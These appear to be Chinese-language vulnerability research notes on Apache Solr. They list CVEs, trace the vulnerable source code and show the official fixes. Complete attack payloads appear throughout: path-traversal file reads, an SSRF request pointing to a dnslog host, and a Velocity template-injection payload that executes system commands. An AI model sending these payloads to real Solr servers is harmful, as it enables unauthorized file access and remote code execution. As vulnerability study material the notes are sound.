# Apache Solr

官方网站： https://solr.apache.org/

历史版本安装包和软件下载： http://archive.apache.org/dist/lucene/solr/

官方漏洞说明： https://issues.apache.org/jira/projects/SOLR/issues/SOLR-15718?filter=allopenissues


历史漏洞
|漏洞编号|漏洞类型|影响版本|
|:----:|:----:|:----:|
|CVE-2021-27905|SSRF|<= 7.7.3, 8.8.1 |
|CVE-2020-13957|RCE|<= 6.6.6、7.7.3、8.6.2 |
|CVE-2019-17558|RCE| 5.0.0-8.3.1|
|CVE-2019-0193|RCE|< 8.2.0|
|CVE-2019-0192|RCE|<= 5.5.5, 6.6.5|
|CVE-2018-1308|XXE|<= 6.6.2, 7.2.1|
|CVE-2017-12629|RCE|< 7.1|
|CVE-2017-12629|XXE|< 7.1|
|CVE-2017-3164|SSRF|<= 7.6|
|CVE-2017-3163|任意文件读取|< 6.4.1|

解压安装包后，即可运行调试
```
// 以debug模式运行
solr.cmd -f -a "-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5555" -p 8983

// 生成测试数据（生成路径为Solr文件夹下的example\example-DIH\solr）
solr.cmd -f -e dih

// 停止服务
solr.cmd stop -p 8983

// 以debug模式运行并执行测试数据
solr.cmd -f -a "-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5555" -p 8983 -s "C:\Solr\solr-6.4.0\example\example-DIH\solr"

// 创建核心
solr.cmd create -c solr_sample

// 删除核心
solr.cmd delete -c solr_sample
```

常用API
```
查看核心
/solr/admin/cores?indexInfo=false&wt=json
查看某一核心的配置
/solr/[core]/config

```

## CVE-2017-3163
问题出现在索引复制功能（Replication），Apache Solr节点会从master/leader节点通过文件名拉取文件。但是并没有对文件名进行校验，就造成了任意文件读取。测试数据中自带的核心包含db、mail、rss、solr、tika

以db核心的Replication功能为例的POC如下
```
GET /solr/db/replication?command=filecontent&file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fwin.ini&wt=filestream&generation=1
```
直接启动Solr默认启动的是jetty服务器，jetty的特点是最终调用某个具体的Handler来处理请求。`jetty ServletHandler.doHandle() -> solr SolrDispatchFilter.doFilter`。然后Solr在处理请求时也会分发到对应的Hanlder。`ReplicationHandler`处理具体请求的核心代码如下
```
public void handleRequestBody(SolrQueryRequest req, SolrQueryResponse rsp) throws Exception {
    final SolrParams solrParams = req.getParams();
    String command = solrParams.get(COMMAND);
    if (command.equals(CMD_INDEX_VERSION)) {...}  // command值为indexversion
    else if (command.equals(CMD_GET_FILE)) { // command值为filecontent
        getFileStream(solrParams, rsp); // 会讲file文件流放在rsp中
    }
    else if (command.equalsIgnoreCase(CMD_FETCH_INDEX)) {  //command值为fetchindex
        String masterUrl = solrParams.get(MASTER_URL);
        final SolrParams paramsCopy = new ModifiableSolrParams(solrParams);
        Thread fetchThread = new Thread(() -> doFetch(paramsCopy, false), "explicit-fetchindex-cmd") ;
        fetchThread.setDaemon(false);
        fetchThread.start();
        rsp.add(STATUS, OK_STATUS);
    }
    ... // filelist、backup、restore、restorestatus、deletebackup、disablepoll、enablepoll、abortfetch、commits、details
}

private void getFileStream(SolrParams solrParams, SolrQueryResponse rsp) {
    ModifiableSolrParams rawParams = new ModifiableSolrParams(solrParams);
    rawParams.set(CommonParams.WT, FILE_STREAM);
    ...
    } else {
        rsp.add(FILE_STREAM, new DirectoryFileStream(solrParams));
    }
}

public DirectoryFileStream(SolrParams solrParams) {
    params = solrParams;
    fileName = params.get(FILE); // 从请求中获取file属性值，即文件名
    cfileName = params.get(CONF_FILE_SHORT);
    indexGen = params.getLong(GENERATION);
    ...
}
```
请求处理完成后，会写入响应内容。进而调用的就是`DirectoryFileStream.write()`方法，会将所处核心的数据绝对路径与fileName相拼接，然后读取文件内容，`fos.write(buf, 0, read);fos.flush();`将文件内容写入到响应body中。

漏洞修复
漏洞修复时在DirectoryFileStream构造函数中加入了对于文件名的判断，包含`..`或者是绝对路径都是抛出异常
```
protected String validateFilenameOrError(String filename){
	if(filename!=null){
		if("..".equals(subpath.toString())){throw new SolrException()}
		if(filePath.isAbsolute()){throw new SolrException()}
	}
}
```

## CVE-2017-3164
问题同样出现在索引复制功能（Replication），如同上面ReplicationHandler处理具体请求的核心代码，command为fetchindex时，会更新要下载的文件列表。最终调用的是`IndexFetcher.fetchFileList()`，创建一个HttpSolrClient发送请求，造成SSRF漏洞。
```
NamedList getLatestVersion() throws IOException {
    QueryRequest req = new QueryRequest(params);
    try (HttpSolrClient client = new HttpSolrClient.Builder(masterUrl).withHttpClient(myHttpClient).build()) {
      client.setSoTimeout(60000);
      client.setConnectionTimeout(15000);

      return client.request(req);
    } ...
  }
```
POC
```
GET /solr/db/replication?command=fetchindex&masterUrl=http://xxx.dnslog.cn/xxxx&wt=json&httpBasicAuthUser=aaa&httpBasicAuthPassword=bbb HTTP/1.1
```

## CVE-2017-12629
XML有很多解析方式，包括DOM、SAX、JDO、DOM4J等技术。其中DOM最常用的解析方式如下。如果可以引用外部实体，就会造成XXE漏洞。所以一般的防御方式是在代码中加入`factory.setExpandEntityReferences(false);`来禁用外部实体。
```
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
File f = new File("books.xml");
Document doc = builder.parse(f);
```
lucene的核心解析器`CoreParser`解析xml时的代码简化如下，发现并没有禁用外部实体，存在XXE漏洞
```
  static Document parseXML(InputStream pXmlFile) throws ParserException {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    DocumentBuilder db = dbf.newDocumentBuilder();
    org.w3c.dom.Document doc = db.parse(pXmlFile);
    return doc;
  }
```
官方在修复此漏洞时则是在上述代码中加入`dbf.setFeature("http://javax.xml.XMLConstants/feature/secure-processing",true)`

## CVE-2018-1308
同样是XXE漏洞，问题出在`DataImportHandler`处理请求时，会加载配置文件。`DataImportHandler.handleRequestBody() -> DataImporter.maybeReloadConfiguration() -> DataImporter.loadDataConfig()`，代码如下也没有禁用外部实体。
```
public DIHConfiguration loadDataConfig(InputSource configFile) {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    if (this.core != null && configFile.getSystemId() != null) {
        dbf.setXIncludeAware(true);
        dbf.setNamespaceAware(true);
    }
    DocumentBuilder builder = dbf.newDocumentBuilder();
    if (this.core != null) {
        builder.setEntityResolver(new SystemIdResolver(this.core.getResourceLoader()));
    }
    builder.setErrorHandler(XMLLOG);
    Document document=builder.parse(configFile);
    dihcfg = this.readFromXml(document);
}
```


## CVE-2019-17558
查看某一核心的solrconfig.xml配置文件，有如下配置。QueryResponseWriter是Solr插件，可以定义任何请求的响应格式。
```
<queryResponseWriter name="velocity" class="solr.VelocityResponseWriter" startup="lazy">
    <str name="template.base.dir">${velocity.template.base.dir:}</str>
</queryResponseWriter>
```
2Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模版，默认设置是false。
通过请求开启`params.resource.loader.enabled`（此配置默认为false，即默认不允许加载器指定模板），否则模版执行会报错`unable to find resource 'custom.vm'`
```
POST /solr/db/config HTTP/1.1
Content-Type: application/json

{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
```
SSTI命令执行+回显payload
```
GET /solr/db/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
```


## 任意文件读取
首先修改配置
```
POST /solr/db/config HTTP/1.1
Content-Type: application/json

{  "set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
```
读取文件
```
curl "http://172.16.165.146:8983/solr/db/debug/dump?param=ContentStreams" -F "stream.url=file:///C:/Windows/win.ini"
```


## Solr资料
https://github.com/veracode-research/solr-injection

https://raw.githubusercontent.com/artsploit/solr-injection/master/slides/DEFCON-27-Michael-Stepankin-Apache-Solr-Injection.pdf

